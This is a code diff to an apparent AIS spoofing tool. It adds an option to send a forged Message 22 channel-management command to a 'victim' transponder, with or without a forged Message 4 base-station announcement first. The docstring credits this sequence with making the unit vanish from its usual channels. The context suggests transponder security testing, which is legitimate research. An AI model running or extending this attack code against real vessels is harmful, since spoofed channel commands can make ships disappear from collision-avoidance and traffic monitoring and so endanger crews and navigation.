@@ -753,7 +753,7 @@ def build_chanmgmt(ctx):
 M20_TARGET_OFFSETS = [60, 420, 810, 1170, 1525, 1870]   # bracket a slow Class A's typical slots
 
 
-def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None, src_mmsi=None, power=0, tx_rx=0):
+def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None, src_mmsi=None, power=0, tx_rx=0, announce=True):
     """EXACT replica of the sequence that vanished the unit in the first successful run: announce
     the base as its OWN step, then send the channel switch ALONE -- no Msg 4 in the same burst, no
     second command, and (when run without --clear-region) no position jumping. With the default
@@ -772,15 +772,21 @@ def build_chanmgmt_switch(ctx, ch_a=None, ch_b=None, src_mmsi=None, power=0, tx_
     label = "ordinary ship" if is_ship else "base"
     name = "cm_m22_ship_altchan" if is_ship else "cm_m22_base_altchan"
     vlat, vlon = ctx.victim_lat, ctx.victim_lon
-    return [
-        ("cm_announce_base",
+    cells = []
+    if announce:
+        cells.append(("cm_announce_base",
             [(enc.encode_type4(BASE_MMSI, vlat + 0.2, vlon + 0.2, hour=12, minute=0, second=0),
-              "Msg4 base-station announcement")]),
-        (name,
-            [(_m22_regional(src, vlat, vlon, ch_a, ch_b, power=power, tx_rx=tx_rx),
-              f"M22 ({label}) ch {ch_a}/{ch_b} power={'LOW' if power else 'high'} "
-              f"txrx={tx_rx} -- check serial ACA and the witness signal level / channels")]),
-    ]
+              "Msg4 base-station announcement")]))
+    # announce=False drops the base entirely, so the M22 arrives with NO base cell present.
+    # If the unit still acts on it, the regional command is honoured on the geo box alone, with
+    # no base concept at all; if it does not, the unit requires some base to exist (still
+    # spoofable) but does not bind the M22 to it.
+    cells.append((name,
+        [(_m22_regional(src, vlat, vlon, ch_a, ch_b, power=power, tx_rx=tx_rx),
+          f"M22 ({label}) ch {ch_a}/{ch_b} power={'LOW' if power else 'high'} "
+          f"txrx={tx_rx}{'' if announce else ' NO-BASE-ANNOUNCE'} "
+          f"-- check serial ACA and the witness signal level / channels")]))
+    return cells
 
 
 def build_chanmgmt_gentle(ctx):
@@ -1142,6 +1148,12 @@ def main():
                     help="M22 Tx/Rx mode: 0 = both channels (default), 1 = Tx on channel A only, "
                          "2 = Tx on channel B only. Keep default channels so you can watch the unit "
                          "drop one channel on the witness.")
+    ap.add_argument("--switch-no-announce", action="store_true",
+                    help="do NOT announce a base (skip the Msg 4) before the M22. Sends the channel/"
+                         "power command with no base cell present at all. If the unit still acts on "
+                         "it, the regional M22 is honoured on the geo box alone with no base concept; "
+                         "if it does not, the unit needs some base to exist (still spoofable) but does "
+                         "not bind the M22 to it. Pair with --switch-src regular for the cleanest test.")
     ap.add_argument("--chanmgmt-gentle", action="store_true",
                     help="run ONLY the non-channel base-station commands (M16 rate, M20 slots, M23 "
                          "group), base then ship, in one clean pass -- no channel change, no "
@@ -1512,7 +1524,8 @@ def main():
         if args.chanmgmt or args.chanmgmt_only or args.chanmgmt_switch_only:
             _switch_src = REGULAR_MMSI if args.switch_src == "regular" else BASE_MMSI
             cm = (build_chanmgmt_switch(ctx, args.switch_ch_a, args.switch_ch_b, _switch_src,
-                                        power=args.switch_power, tx_rx=args.switch_txrx)
+                                        power=args.switch_power, tx_rx=args.switch_txrx,
+                                        announce=not args.switch_no_announce)
                   if args.chanmgmt_switch_only else build_chanmgmt(ctx))
             if args.chanmgmt_no_switch and not args.chanmgmt_switch_only:
                 # drop the channel-switch cells; keep everything the unit self-recovers from, so a
